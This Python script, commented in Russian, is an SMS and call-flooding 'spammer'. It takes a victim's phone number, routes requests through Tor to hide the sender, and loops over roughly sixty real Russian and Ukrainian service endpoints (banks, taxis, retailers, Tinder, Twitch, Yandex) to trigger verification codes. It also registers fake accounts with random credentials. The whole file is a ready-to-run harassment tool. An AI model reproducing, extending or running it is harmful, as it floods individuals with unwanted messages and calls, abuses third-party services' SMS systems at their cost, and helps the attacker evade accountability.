import requests
import random
from colorama import Fore

# __________________________________________ Подготовка номеров
_phone = input('\n Введи номер: ')
if _phone[0] == '+':
    _phone = _phone[1:]
if _phone[0] == '8':
    _phone = '7' + _phone[1:]
if _phone[0] == '9':
    _phone = '7' + _phone
_phone9 = _phone[1:]

# ____________________________________________ Проверка Proxy
ipSite = 'http://icanhazip.com'
adress = requests.get(ipSite)
print("\n[*] IP your network:\n" + adress.text )
proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}
try:
    adress = requests.get(ipSite, proxies=proxies)
    print('\nProxy IP:', adress.text)
except:
    print("/\n\u001b[31m[x] Stopping connect to the Tor network\u001b[0m\n" )
# ____________________________________________ Конец проверки


iteration = 0
while iteration < 2:
    _name = ''
    for x in range(12):
        _name = _name + random.choice(list(
            '123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list(
            '123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list(
            '123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + f'{iteration}' + '@gmail.com'
    email = _email
    print('\nСпамер запущен.\nЕсли хочешь остановить - нажмите Ctrl+C.')
    print(Fore.RED)

    try:
        requests.post("https://3040.com.ua/taxi-ordering",
                      data={"callback-phone": _phone},
                      proxies=proxies)
    except:
        print('Error 3040.com.ua')
    try:
        requests.post("https://alfalife.cc/auth.php",
                      data={"phone": _phone},
                      proxies=proxies)
    except:
        print('Error alfalife.cc')
    try:
        requests.post(
            "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
            data={"phone": _phone}, proxies=proxies)
    except:
        print('Error api-prime.anytime.global')
    try:
        requests.post("https://app.benzuber.ru/login",
                      data={"phone": "+" + _phone},
                      proxies=proxies)
    except:
        print('Error app.benzuber.ru')
    try:
        requests.post("https://api.carsmile.com/",
                      json={"operationName": "enterPhone",
                            "variables": {"phone": _phone},
                            "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n", },
                      proxies=proxies)
    except:
        print('Error api.carsmile.com')
    try:
        requests.post(
            "https://www.citilink.ru/registration/confirm/phone/+" + _phone + "/")
    except:
        print('Error www.citilink.ru')
    try:
        requests.post(
            "https://city24.ua/personalaccount/account/registration",
            data={"PhoneNumber": _phone}, proxies=proxies)
    except:
        print('Error city24.ua')
    try:
        requests.post(
            "https://app.cloudloyalty.ru/demo/send-code",
            json={"country": 2, "phone": _phone,
                  "roistatVisit": "47637", "experiments": {
                    "new_header_title": "1"}, },
            proxies=proxies)
    except:
        print('Error app.cloudloyalty.ru')
    try:
        requests.post(
            "https://api.delitime.ru/api/v2/signup",
            data={"SignupForm[username]": _phone,
                  "SignupForm[device_type]": 3, },
            proxies=proxies)
    except:
        print('Error api.delitime.ru')
    try:
        requests.post(
            "https://dostavista.ru/backend/send-verification-sms",
            data={"phone": _phone}, proxies=proxies)
    except:
        print('Error dostavista.ru')
    try:
        requests.post(
            "https://api.easypay.ua/api/auth/register",
            json={"phone": _phone, "password": _name},
            proxies=proxies)
    except:
        print('Error api.easypay.ua')
    try:
        requests.post(
            "https://www.finam.ru/api/smslocker/sendcode",
            data={"phone": "+" + _phone}, proxies=proxies)
    except:
        print('Error www.finam.ru')
    try:
        requests.get("https://findclone.ru/register",
                     params={"phone": "+" + _phone},
                     proxies=proxies)
    except:
        print('Error findclone.ru')
    try:
        requests.post(
            "https://fix-price.ru/ajax/register_phone_code.php",
            data={"register_call": "Y", "action": "getCode",
                  "phone": "+" + _phone}, proxies=proxies)
    except:
        print('Error fix-price.ru')
    try:
        requests.post(
            "https://guru.taxi/api/v1/driver/session/verify",
            json={"phone": {"code": 1, "number": _phone}},
            proxies=proxies)
    except:
        print('Error guru.taxi')
    try:
        requests.post(
            "https://helsi.me/api/healthy/accounts/login",
            json={"phone": _phone, "platform": "PISWeb"},
            proxies=proxies)
    except:
        print('Error helsi.me')
    try:
        requests.post("https://icq.com/smscode/login/ru",
                      data={"msisdn": _phone},
                      proxies=proxies)
    except:
        print('Error icq.com')
    try:
        requests.post(
            "https://terra-1.indriverapp.com/api/authorization?locale=ru",
            data={"mode": "request", "phone": "+" + _phone,
                  "phone_permission": "unknown",
                  "stream_id": 0, "v": 3,
                  "appversion": "3.20.6",
                  "osversion": "unknown",
                  "devicemodel": "unknown", },
            proxies=proxies)
    except:
        print('Error terra-1.indriverapp.com')
    try:
        requests.post(
            "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
            data={"password": _name, "application": "lkp",
                  "login": "+" + _phone}, proxies=proxies)
    except:
        print('Error lk.invitro.ru')
    try:
        requests.post(
            "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
            json={"phone": _phone}, proxies=proxies)
    except:
        print('Error ube.pmsm.org.ru')
    try:
        requests.post(
            "https://api.ivi.ru/mobileapi/user/register/phone/v6",
            data={"phone": _phone}, proxies=proxies)
    except:
        print('Error api.ivi.ru')
    try:
        requests.post(
            "https://app.karusel.ru/api/v1/phone/",
            data={"phone": _phone}, proxies=proxies)
    except:
        print('Error app.karusel.ru')
    try:
        requests.post(
            "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
            json={"phone": "+" + _phone}, proxies=proxies)
    except:
        print('Error app-api.kfc.ru')
    try:
        requests.post(
            "https://api.kinoland.com.ua/api/v1/service/send-sms",
            headers={"Agent": "website"},
            json={"Phone": _phone, "Type": 1},
            proxies=proxies)
    except:
        print('Error api.kinoland.com.ua')
    try:
        requests.post(
            "https://lenta.com/api/v1/authentication/requestValidationCode",
            json={"phone": "+" + _phone}, proxies=proxies)
    except:
        print('Error lenta.com')
    try:
        requests.post(
            "https://cloud.mail.ru/api/v2/notify/applink",
            json={"phone": "+" + _phone, "api": 2,
                  "email": "email", "x-email": "x-email", },
            proxies=proxies)
    except:
        print('Error cloud.mail.ru')
    try:
        requests.post(
            "https://www.menu.ua/kiev/delivery/profile/show-verify.html",
            data={"phone": _phone, "do": "phone"},
            proxies=proxies)
    except:
        print('Error www.menu.ua')
    try:
        requests.post(
            "https://www.menu.ua/kiev/delivery/registration/direct-registration.html",
            data={"user_info[fullname]": _name,
                  "user_info[phone]": _phone,
                  "user_info[email]": email,
                  "user_info[password]": _name,
                  "user_info[conf_password]": _name, },
            proxies=proxies)
    except:
        print('Error www.menu.ua')
    try:
        requests.post("https://mobileplanet.ua/register",
                      data={"klient_name": _name,
                            "klient_phone": "+" + _phone,
                            "klient_email": email},
                      proxies=proxies)
    except:
        print('Error mobileplanet.ua')
    try:
        requests.post(
            "https://www.monobank.com.ua/api/mobapplink/send",
            data={"phone": "+" + _phone}, proxies=proxies)
    except:
        print('Error www.monobank.com.ua')
    try:
        requests.post(
            "https://www.moyo.ua/identity/registration",
            data={"firstname": _name, "phone": _phone,
                  "email": email}, proxies=proxies)
    except:
        print('Error www.moyo.ua')
    try:
        requests.post("https://auth.multiplex.ua/login",
                      json={"login": _phone},
                      proxies=proxies)
    except:
        print('Error auth.multiplex.ua')
    try:
        requests.post(
            "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
            params={
                "pageName": "registerPrivateUserPhoneVerificatio"},
            data={"phone": _phone, "recaptcha": "off",
                  "g-recaptcha-response": ""},
            proxies=proxies)
    except:
        print('Error www.mvideo.ru')
    try:
        requests.post(
            "https://account.my.games/signup_send_sms/",
            data={"phone": _phone}, proxies=proxies)
    except:
        print('Error account.my.games')
    try:
        requests.post("https://www.nl.ua", data={
            "component": "bxmaker.authuserphone.login",
            "sessid": "bf70db951f54b837748f69b75a61deb4",
            "method": "sendCode", "phone": _phone,
            "registration": "N"}, proxies=proxies)
    except:
        print('Error www.nl.ua", data={')
    try:
        requests.post(
            "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
            data={"st.r.phone": "+" + _phone},
            proxies=proxies)
    except:
        print('Error ok.ru')
    try:
        requests.post("https://www.ollis.ru/gql", json={
            "query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }' % _phone},
                      proxies=proxies)
    except:
        print('Error www.ollis.ru')
    try:
        requests.get(
            "https://secure.online.ua/ajax/check_phone/",
            params={"reg_phone": _phone}, proxies=proxies)
    except:
        print('Error secure.online.ua')
    try:
        requests.post(
            "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
            json={"phone": _phone, "otpId": 0},
            proxies=proxies)
    except:
        print('Error www.ozon.ru')
    try:
        requests.get(
            "https://cabinet.planetakino.ua/service/sms",
            params={"phone": _phone}, proxies=proxies)
    except:
        print('Error cabinet.planetakino.ua')
    try:
        requests.post(
            "https://plink.tech/resend_activation_token/?via=call",
            json={"phone": _phone}, proxies=proxies)
    except:
        print('Error plink.tech')
    try:
        requests.post("https://plink.tech/register/",
                      json={"phone": _phone},
                      proxies=proxies)
    except:
        print('Error plink.tech')
    try:
        requests.post(
            "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
            json={"phone": _phone}, proxies=proxies)
    except:
        print('Error qlean.ru')
    try:
        requests.post(
            "https://app.redmondeda.ru/api/v1/app/sendverificationcode",
            headers={"token": "."}, data={"phone": _phone},
            proxies=proxies)
    except:
        print('Error app.redmondeda.ru')
    try:
        requests.post(
            "https://pass.rutube.ru/api/accounts/phone/send-password/",
            json={"phone": _phone}, proxies=proxies)
    except:
        print('Error pass.rutube.ru')
    try:
        requests.post(
            "https://app.sberfood.ru/api/mobile/v3/auth/sendSms",
            json={"userPhone": "+" + _phone}, headers={
                "AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"},
            proxies=proxies)
    except:
        print('Error app.sberfood.ru')
    try:
        requests.post(
            "https://shopandshow.ru/sms/password-request/",
            data={"phone": "+" + _phone, "resend": 0},
            proxies=proxies)
    except:
        print('Error shopandshow.ru')
    try:
        requests.get(
            "https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",
            params={"oper": 9, "callmode": 1,
                    "phone": "+" + _phone}, proxies=proxies)
    except:
        print('Error register.sipnet.ru')
    try:
        requests.post(
            "https://smart.space/api/users/request_confirmation_code/",
            json={"mobile": "+" + _phone,
                  "action": "confirm_mobile"},
            proxies=proxies)
    except:
        print('Error smart.space')
    try:
        requests.get("https://www.sportmaster.ua/",
                     params={"module": "users",
                             "action": "SendSMSReg",
                             "phone": _phone},
                     proxies=proxies)
    except:
        print('Error www.sportmaster.ua')
    try:
        requests.post(
            "https://api.sunlight.net/v3/customers/authorization/",
            data={"phone": _phone}, proxies=proxies)
    except:
        print('Error api.sunlight.net')
    try:
        requests.post(
            "https://msk.tele2.ru/api/validation/number/" + _phone,
            json={"sender": "Tele2"}, proxies=proxies)
    except:
        print('Error msk.tele2.ru')
    try:
        requests.post(
            "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
            data={"phone_number": _phone}, proxies=proxies)
    except:
        print('Error api.gotinder.com')
    try:
        requests.post("https://api.tinkoff.ru/v1/sign_up",
                      data={"phone": "+" + _phone},
                      proxies=proxies)
    except:
        print('Error api.tinkoff.ru')
    try:
        requests.post(
            "https://passport.twitch.tv/register?trusted_request=true",
            json={"birthday": {"day": 11, "month": 11,
                               "year": 1999},
                  "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                  "include_verification_code": True,
                  "password": _name, "phone_number": _phone,
                  "username": _name}, proxies=proxies)
    except:
        print('Error passport.twitch.tv')
    try:
        requests.post(
            "https://www.uklon.com.ua/api/v1/account/code/send",
            headers={
                "client_id": "6289de851fc726f887af8d5d7a56c635"},
            json={"phone": _phone}, proxies=proxies)
    except:
        print('Error www.uklon.com.ua')
    try:
        requests.post(
            "https://pay.visa.ru/api/Auth/code/request",
            json={"phoneNumber": "+" + _phone},
            proxies=proxies)
    except:
        print('Error pay.visa.ru')
    try:
        requests.post(
            "https://shop.vsk.ru/ajax/auth/postSms/",
            data={"phone": _phone}, proxies=proxies)
    except:
        print('Error shop.vsk.ru')
    try:
        requests.post(
            "https://ng-api.webbankir.com/user/v2/create",
            json={"lastName": _name, "firstName": _name,
                  "middleName": _name, "mobilePhone": _phone,
                  "email": email, "smsCode": ""},
            proxies=proxies)
    except:
        print('Error ng-api.webbankir.com')
    try:
        requests.post(
            "https://cabinet.wi-fi.ru/api/auth/by-sms",
            data={"msisdn": _phone},
            headers={"App-ID": "cabinet"}, proxies=proxies)
    except:
        print('Error cabinet.wi-fi.ru')
    try:
        requests.post(
            "https://api.iconjob.co/api/auth/verification_code",
            json={"phone": _phone}, proxies=proxies)
    except:
        print('Error api.iconjob.co')
    try:
        requests.post(
            "https://api.wowworks.ru/v2/site/send-code",
            json={"phone": _phone, "type": 2},
            proxies=proxies)
    except:
        print('Error api.wowworks.ru')
    try:
        requests.post(
            "https://api.chef.yandex/api/v2/auth/sms",
            json={"phone": _phone}, proxies=proxies)
    except:
        print('Error api.chef.yandex')
    try:
        requests.post(
            "https://eda.yandex/api/v1/user/request_authentication_code",
            json={"phone_number": "+" + _phone},
            proxies=proxies)
    except:
        print('Error eda.yandex')
    try:
        requests.post(
            "https://www.yaposhka.kh.ua/customer/account/createpost/",
            data={"success_url": "", "error_url": "",
                  "is_subscribed": "0", "firstname": _name,
                  "lastname": _name, "email": email,
                  "password": _name,
                  "password_confirmation": _name,
                  "telephone": _phone}, proxies=proxies)
    except:
        print('Error www.yaposhka.kh.ua')
    try:
        requests.post(
            "https://youla.ru/web-api/auth/request_code",
            data={"phone": _phone}, proxies=proxies)
    except:
        print('Error youla.ru')
    iteration += 1

    print(Fore.GREEN)
    print('Круг пройден')
